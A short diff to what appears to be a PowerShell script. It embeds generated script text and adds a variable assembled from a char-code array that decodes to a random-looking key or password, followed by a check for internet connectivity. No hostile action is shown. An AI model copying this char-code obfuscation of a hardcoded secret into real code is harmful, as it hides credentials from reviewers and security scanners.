@@ -1,4 +1,9 @@
 $Content = "
+
+`$he = ([char[]](97,115,100,104,106,115,100,102,103,106,100,104,106,103,115,97,106,104,
+       104,106,103,100,97,115,100,115,97,103,99,120,122,116,119,51,50,54,55,100,110,50,
+       51,100,103,104,119,101,101,102,33,33,102,100,97,116,104) -Join '')
+
 if(Get-NetRoute | Where-Object DestinationPrefix -eq '0.0.0.0/0' | Get-NetIPInterface | Where-Object ConnectionState -eq 'Connected'){`$ConnectedToTheInternet = `$true}
 
 if(-not `$ConnectedToTheInternet){
